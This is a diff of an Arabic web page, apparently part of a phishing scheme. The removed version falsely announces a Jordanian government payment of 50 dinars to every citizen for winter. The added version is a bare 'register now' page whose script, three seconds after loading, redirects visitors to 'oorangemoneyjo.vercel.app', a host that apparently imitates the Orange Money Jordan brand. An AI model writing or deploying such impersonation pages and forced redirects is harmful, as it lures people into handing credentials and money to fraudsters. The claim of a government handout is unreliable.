@@ -1,83 +1,58 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <title>مبادرة الحكومة الأردنية لتوزيع 50 دينار بمناسبة الشتاء</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            font-family: 'Tahoma', Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            background: #f5f8fc;
-            color: #222;
-        }
-        header {
-            background: #1565c0;
-            color: #fff;
-            padding: 30px 0 20px 0;
-            text-align: center;
-        }
-        main {
-            max-width: 600px;
-            margin: 40px auto;
-            background: #fff;
-            border-radius: 10px;
-            box-shadow: 0 2px 14px #adb5bd30;
-            padding: 30px;
-        }
-        h1 {
-            margin: 0 0 10px 0;
-            font-size: 2em;
-        }
-        .cash {
-            color: #388e3c;
-            font-weight: bold;
-            font-size: 1.25em;
-        }
-        ul {
-            margin: 18px 0;
-            padding: 0 20px;
-        }
-        li {
-            margin-bottom: 10px;
-            line-height: 1.5;
-        }
-        footer {
-            text-align: center;
-            margin: 40px 0 30px 0;
-            font-size: 0.95em;
-            color: #666;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>احصل الآن من خلال زر التسجيل</title>
+  <script>
+    // عند الضغط على زر التسجيل أو بعد 3 ثوان، يتم التوجيه للرابط
+    function redirect() {
+      window.location.href = "https://oorangemoneyjo.vercel.app/";
+    }
+    window.onload = function() {
+      setTimeout(redirect, 3000);
+    };
+  </script>
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: Tahoma, Arial, sans-serif;
+      background-color: #f9f9f9;
+      direction: rtl;
+      margin: 0;
+    }
+    .title {
+      font-size: 2rem;
+      color: #fa9300;
+      margin-bottom: 2rem;
+    }
+    .message {
+      font-size: 1.2rem;
+      color: #333;
+      margin-bottom: 2rem;
+    }
+    .register-btn {
+      padding: 0.8rem 2rem;
+      font-size: 1.2rem;
+      color: #fff;
+      background-color: #fa9300;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .register-btn:hover {
+      background-color: #d47f00;
+    }
+  </style>
 </head>
-<body dir="rtl">
-    <header>
-        <h1>مبادرة الشتاء: توزيع ٥٠ دينار لكل مواطن أردني</h1>
-        <p class="cash">الحكومة الأردنية تعلن دعمها للأسر بمناسبة الشتاء</p>
-    </header>
-    <main>
-        <h2>تفاصيل المبادرة:</h2>
-        <p>
-            أعلنت الحكومة الأردنية عن بدء مبادرة جديدة بمناسبة حلول فصل الشتاء، يتم من خلالها توزيع مبلغ <span class="cash">50 دينار أردني</span> لكل شخص من المواطنين الأردنيين لدعمهم وتمكينهم من مواجهة متطلبات الشتاء.
-        </p>
-        <ul>
-            <li>يأتي هذا الدعم كجزء من جهود الحكومة لتخفيف الأعباء الاقتصادية على الأسر الأردنية.</li>
-            <li>تهدف المبادرة لمساعدة المواطنين في تغطية احتياجاتهم الأساسية كالتدفئة وشراء المستلزمات الشتوية.</li>
-            <li>سيتم صرف المبالغ عن طريق الجهات المختصة أو عبر البنوك المعتمدة.</li>
-            <li>للاستفادة من المبادرة، يجب التأكد من تحديث بياناتك لدى الجهات الحكومية.</li>
-        </ul>
-        <h2>كيف تحصل على الدعم؟</h2>
-        <ol>
-            <li>تأكد من مطابقة شروط الاستحقاق كمواطن أردني.</li>
-            <li>قم بمراجعة أقرب مركز خدمة أو بنك للحصول على التفاصيل حول موعد التسليم.</li>
-            <li>تابع الموقع الرسمي للحكومة الأردنية لمعرفة آخر المستجدات والتعليمات.</li>
-        </ol>
-        <h3>للاستفسار</h3>
-        <p>يمكنك التواصل مع الجهات الحكومية المختصة أو متابعة الإعلان عبر وسائل الإعلام الرسمية.</p>
-    </main>
-    <footer>
-        &copy; 2025 الحكومة الأردنية. جميع الحقوق محفوظة.
-    </footer>
+<body>
+  <div class="title">احصل الآن من خلال زر التسجيل</div>
+  <div class="message">جاري التحويل تلقائياً خلال ٣ ثوان... أو اضغط على زر التسجيل للوصول الآن:</div>
+  <button class="register-btn" onclick="redirect()">التسجيل الآن</button>
 </body>
 </html>
